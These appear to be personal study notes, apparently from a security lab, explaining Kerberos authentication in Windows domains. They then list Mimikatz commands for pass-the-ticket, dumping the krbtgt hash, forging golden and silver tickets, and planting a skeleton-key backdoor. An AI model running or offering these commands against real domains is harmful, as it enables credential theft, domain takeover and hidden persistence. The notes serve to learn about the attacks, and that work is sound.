# Kerberos
Is the default authentication service for Windows domains. 

## Keywords
| Word | Alias | Description |
| ---- | ------- | ----------- |
| Ticket Granting Ticket | TGT | An authentication ticket that is used to request service tickets from the TGS for specifc resources from the domain. |
| Key Distribution Center | KDC | Service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service |
| Authentication Service | AS | Issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets |
| Ticket Granting Service | TGS | Takes the TGT and returns a ticket to the machine in the domain. |
| Service Principal Name | SPN | Identifier given to a service to associate it with a domain service account. |
| KDC Long Term Secret Key | KDC LT Key | Based on the KRBTGT service account. Encrypts TGT and sign the PAC |
| Client Long Term Secret Key | Client LT Key |  Based 

## Authentication Steps

### AS-REQ 
Starts when a user requests a TGT from the KDC.
- user encrypts a timestamp NT hash and sends it to the AS
- KDC decrypts the timestamp using the NT hash from the user
- Issues TGT

### TGT Contents
Start / end / renew timestamsp        
Service name: krbtgt; example.local  
Target name : krbtgt; example.local 
Client name : user; example.local  
Flags: 00x0x0x0x0                 
Session key:0x0x0x0x0x0x         

### Service Ticket Contents

Service portion:
- user details
- session key
- encrypts ticket with the service account NTLM hash

User portion:
- validitiy timestamp
- session key
- encryts with TGT session key


### Flow
User    -> requests TGT         -> DC
User    <- TGT + session key    <- DC
User    -> Ticket Auth          -> DC
User    <- Ticket + session key <- DC

User    -> Request + Auth       ->  Resource Server
User    <- Authenticated        <-  Resource Server

1. Client requests TGT
2. KDC verifies client and sends back encrypted TGT
3. Client sends TGT to Ticket Granting Server (TGS) with SPN of the service
4. KDC verifies TGT of user and access to service. Replies with session key
5. Client requests service and sends session key
6. Service grants access

## Abusing Pre Authentication
- Does not trigger account failed to log on event
- Sends single UDP frame to KDC to enumerate the users 


## Mimikatz

## Pass the Ticket
This attack involves re-using an existing (unsecured) ticket pulled from LSASS memory.
- Dumps TGT from LSASS memory
- Results in .kirbi ticket 
- Requires elevated command prompt test with `mimikatz.exe; privilege::debug`

1. Export all kirbi tickets
Run mimikatz,and in the prompt provided run the following command.
- Look for administrator related accounts
- Take note of the ticket name to be used later

```sh
mimikatz.exe
mimikatz # sekurlsa::tickets /export
```

## Golden Ticket:
- dump the krbtgt ticket for access to everything
- provides SID
- NTLM Hash

The following command will dump the hash and security identifier we need to create the ticket
```sh
mimikatz.exe
mimikatz # lsadump::lsa /inject /name:krbtgt
```

Using the security identifier and hash we can now run:
`sid:` - Security Identifier 
`krbtgt:` - NTLM Hash
`id:` - Anything

```sh
mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-894... /krbtgt:72cd... /id:500
```

## Silver Ticket:
- dump service or domain admin ticket
- Less Access
```sh
mimikatz # lsadump::lsa /inject /name:SQLService 
```

## Skeleton Key
A kerberos backdoor acts similar to a rootkit by implanting itself into the memory of the domain forest. This will allow access to any machine with a master password.
- Only works using Kerberos RC4 encryption

This works by exploiting the AS-REQ timestamps. 
- Each timestamp is encrypted with the users NT hash.
- When a skeleton key is present the domain controller will use both the user and the key hash
- The key will not persist. Other methods are required to maintain persistence

Create a skeleton key
```sh
mimikatz # misc::skeleton
```

Access the forest
- Default password will be `mimikatz`
```sh
net use C:\\domain-controller\admin$/user:Administrator mimikatz
```

